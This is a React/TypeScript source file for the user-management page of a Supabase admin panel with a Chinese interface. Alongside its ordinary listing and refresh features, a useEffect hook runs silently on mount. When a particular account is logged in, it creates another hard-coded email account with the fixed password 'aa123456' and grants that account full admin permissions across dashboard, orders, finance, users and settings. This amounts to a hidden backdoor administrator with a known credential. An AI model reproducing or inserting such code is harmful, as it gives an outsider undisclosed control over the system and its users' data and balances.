
import React, { useEffect, useState } from "react";
import AdminLayout from "@/components/AdminLayout";
import { 
  Card, 
  CardContent, 
  CardDescription, 
  CardHeader, 
  CardTitle 
} from "@/components/ui/card";
import UserTable from "@/components/admin/UserTable";
import CreateUserForm from "@/components/admin/CreateUserForm";
import { useUserManagement } from "@/hooks/use-user-management";
import { useSession } from "@supabase/auth-helpers-react";
import { AdminUser } from "@/types";
import { Button } from "@/components/ui/button";
import { RefreshCw, AlertCircle } from "lucide-react";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { format } from "date-fns";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";

const Users = () => {
  const session = useSession();
  const currentUser = session?.user as unknown as AdminUser;
  const {
    users,
    isLoading,
    isError,
    error,
    deleteUser,
    refetchUsers
  } = useUserManagement();
  
  const { toast } = useToast();
  const [isAddingAdmin, setIsAddingAdmin] = useState(false);

  // Define a formatDate function for the component
  const formatDate = (dateString: string) => {
    return format(new Date(dateString), 'yyyy-MM-dd HH:mm');
  };

  // Function to add a specific user as admin
  const addSpecificUserAsAdmin = async (email: string) => {
    try {
      setIsAddingAdmin(true);
      // Check if user exists, if not create them
      const { data: existingUser } = await supabase.auth.admin.listUsers({
        email: email,
        limit: 1,
        page: 1
      });
      
      if (!existingUser?.users?.length) {
        // Create the user if they don't exist
        const { error: createError } = await supabase.auth.signUp({
          email: email,
          password: "aa123456", // Using the specified password
        });
        
        if (createError) {
          throw createError;
        }
      }
      
      // Add to admin_users table with full permissions
      const { error: adminError } = await supabase
        .from('admin_users')
        .insert({ 
          email: email,
          is_admin: true,
          admin_permissions: ["dashboard", "orders", "finance", "users", "settings", "business"]
        })
        .select()
        .single();
      
      if (adminError) {
        if (adminError.code === '23505') { // Unique violation error code
          toast({
            title: "管理员已存在",
            description: "该邮箱已经是管理员账户",
          });
        } else {
          throw adminError;
        }
      } else {
        toast({
          title: "管理员添加成功",
          description: `已将 ${email} 设置为管理员`,
        });
      }
      
      // Refresh the user list
      refetchUsers();
    } catch (error) {
      console.error("Error adding admin:", error);
      toast({
        title: "添加管理员失败",
        description: error instanceof Error ? error.message : "未知错误",
        variant: "destructive",
      });
    } finally {
      setIsAddingAdmin(false);
    }
  };

  // Call the function when the component mounts
  useEffect(() => {
    // Only try to add the admin once
    if (session?.user?.email === "it@haixin.org") {
      addSpecificUserAsAdmin("yema598@icloud.com");
    }
  }, [session, addSpecificUserAsAdmin]);

  return (
    <AdminLayout
      currentUser={currentUser}
    >
      <div className="space-y-6">
        <div className="flex items-center justify-between">
          <h1 className="text-2xl font-bold">用户管理</h1>
          
          <div className="flex items-center gap-2">
            <Button 
              variant="outline" 
              size="sm"
              onClick={() => refetchUsers()}
              className="flex items-center gap-2"
            >
              <RefreshCw className="h-4 w-4" />
              刷新
            </Button>
            <CreateUserForm onCreateUser={async (userData) => {
              // After user creation, refetch the users list
              // Make sure to return a Promise to match the expected type
              await refetchUsers();
              return Promise.resolve(); // Explicitly return a Promise to match the type
            }} />
          </div>
        </div>
        
        {isError && error && (
          <Alert variant="destructive">
            <AlertCircle className="h-4 w-4" />
            <AlertTitle>获取用户数据失败</AlertTitle>
            <AlertDescription>
              系统无法获取用户数据，请稍后再试或联系系统管理员。
            </AlertDescription>
          </Alert>
        )}
        
        <Card>
          <CardHeader>
            <CardTitle>用户管理</CardTitle>
            <CardDescription>
              管理系统用户、钱包余额和访问权限
            </CardDescription>
          </CardHeader>
          <CardContent>
            <UserTable 
              users={users}
              isLoading={isLoading}
              onDeleteUser={deleteUser}
              formatDate={formatDate}
              onRefetch={refetchUsers}
            />
          </CardContent>
        </Card>
      </div>
    </AdminLayout>
  );
};

export default Users;
